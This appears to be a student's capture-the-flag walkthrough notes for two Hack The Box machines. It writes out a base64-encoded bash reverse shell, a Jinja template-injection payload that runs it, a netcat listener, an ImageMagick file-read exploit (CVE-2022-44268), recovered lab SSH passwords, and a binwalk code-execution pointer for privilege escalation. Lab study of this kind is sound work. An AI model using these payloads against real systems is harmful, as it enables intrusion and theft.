# Week 1 - Sandworm (Medium)
// 1 - random name
// 2 - {{7*7}} name
// 3 - Payload with RS + netcat
// 4 - obtain login credentials + login through SSH => user flag
1. `sudo nmap -sVC <IP> -p0-65535`
    - 22 ssh (OpenSSH 8.9p1 Ubuntu)
    - 80 http (redirect to https://ssa.htb)
    - 443 https

2. website
    - sudo nano /etc/hosts
        - <ip> ssa.htb
    - URL: [ssa.htb](https://ssa.htb)
        - Secret Spy Agency website containing just info + Contact form
            - contact form consists of text to be submitted through PGP-encrypted tip
                - PGP might be the weakness (no other functions on the website)
    - explore possible dirs
        - `gobuster dir -u https://ssa.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k`
            - ![](https://hackmd.io/_uploads/rJcGHZiO3.png)
                - ssa.htb/pgp => PGP public key
3. SSTI possibility (server-side template injection)
    - [guide](https://linuxhint.com/generate-pgp-keys-gpg/)
    - generate PGP key: `sudo gpg --gen-key`
    - export it to the public.key file: `gpg -a -o public.key --export <filled Real name>`
    - `cat public.key`
    - encrypt message "helloworld" using our PGP key: `echo 'helloworld' | gpg --clear-sign`
    - verify, if website accepts our generated PGP key message
        - Public Key (left): generated public key
        - Signed Text: generated PGP message block of "helloworld"
        - ![name=Zihuatanejo ^^](https://hackmd.io/_uploads/rJjzo-od3.png)
        - works fine ==> we can perform SSTI attack
    ![](https://hackmd.io/_uploads/rk3YsWjOn.png)

4. SSTI attack
    - we can encrypt reverse shell connection inside PGP message
    - [guide](https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/)
    - first of all, delete previous PGP keys
        - gpg --list-keys
        - gpg --delete-keys hacker
        - gpg --delete-secret-keys hacker
        - gpg --delete-keys hacker
        - gpg --list-keys ==> no keys found
    - prepare reverse shell
        - encode RS in base64
            - !!! ifconfig: get your tun inet IP !!!
            > echo "bash -c 'bash -i >& /dev/tcp/10.10.14.98/4444 0>&1'" | base64
            > YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==
        - payload for the RS:
            - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash ').read() }}`
    - generate new PGP key
        - gpg --gen-key
            - Real name: 
                - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash ').read() }}`
    
    - `cat public.key`
        - for Public Key (left side)
    - echo 'helloworld' | gpg --clear-sign
        - for Message (right side)
    - lets start listening on prepared port 4444
        - nc -nvlp 4444
    - copy the pub key generated w payload into the UID and verify the signature
    - we are inside
5. obtain login credentials
    - search for the login credentials
            - /home => .ssh => ATLAS
            - .config
                - UN: silentobserver
                - PW: quietLiketheWind22
6. Login to obtain user flag
    - ssh silentobserver@ssa.htb
        - password: quietLiketheWind22
    - ls
    - cat user.txt
    
    
    
    
    
# Week 2 - Pilgrimage (Easy)
1. sudo nmap <IP>
    - 22/tcp open  ssh
    - 80/tcp open  http
2. website
    - sudo nano /etc/hosts
        - <ip> pilgrimage.htb
    - URL: pilgrimage.htb
        - header: login/register forms
        - body: bar for uploading file
        - footer: theme
    - Git dumper
        - `git-dumper http://pilgrimage.htb/.git/ git`
        - ![](https://hackmd.io/_uploads/HJnI3Lu_n.png)

    - website handles images after uploading and shrinks its size on the website
        - separately for each user
        - PNG upload vuln
            - https://github.com/voidz0r/CVE-2022-44268
            - Run the project
                `cargo run "/etc/passwd"`

            - Use the file with ImageMagick
                `convert image.png -resize 50% output.png`


            - Analyze the resized image
                `identify -verbose output.png`

            - Convert hex to str
                `python3 -c 'print(bytes.fromhex("23202f6574632f686f7374730a3132372e302e302e31096c6f63616c686f73740a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3109096c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a3109096970362d616c6c6e6f6465730a666630323a3a3209096970362d616c6c726f75746572730a6475636e740a"))`
    
3. Obtaining User access
    - `726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680d0a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0d0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0d0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0d0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630d0a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0d0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0d0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0d0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0d0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0d0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0d0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0d0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0d0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0d0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0d0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0d0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0d0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0d0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0d0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0d0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0d0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0d0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0d0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680d0a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0d0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0d0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c7365`
    - from hex:
        - `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false`
>         USER EMILY => emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
    
    - dashboard.php file analysis
        - we find SQL queries to a SQLite database located at /var/db/pilgrimage
            - ![](https://hackmd.io/_uploads/Hk_phLOOh.png)
        - We will attempt to download it using a local file inclusion (LFI) vulnerability...
            - `cargo run "/var/db/pilgrimage"`
    - we found correct login credentials for SSH login
| Username | Password | 
| -------- | -------- | 
| emily    | abigchonkyboi123|
        - login through SSH to obtain user flag 
            - ls
            - cat user.txt

4. Priviledge Escalation
    - ls
        - "linpeas.sh" and "pspy64"
        - nano linpeas.sh
            > ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only...
    - Part of the code:
                >   if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
                >   IAMROOT="1"
                >   MAXPATH_FIND_W="3"
                > else
                >   IAMROOT=""
                >   MAXPATH_FIND_W="7"
                > fi
    - ps aux
        ![](https://hackmd.io/_uploads/rySTyPddh.png)
        - we have read permissions to the file
    - cd /usr/sbin && nano malwarescan.sh
        ![](https://hackmd.io/_uploads/B1qSlD_u3.png)
        - The bash script monitors the directory /var/www/pilgrimage.htb/shrunk/ for newly created files and analyzes them for unwanted content using binwalk. If it finds unwanted content in a file, it automatically removes it...
            - The version of Binwalk found is 2.3.2, which has a vulnerability that allows arbitrary code execution. We will leverage this vulnerability to escalate our access privileges.
                - https://www.exploit-db.com/exploits/51249
                - https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/ 
    



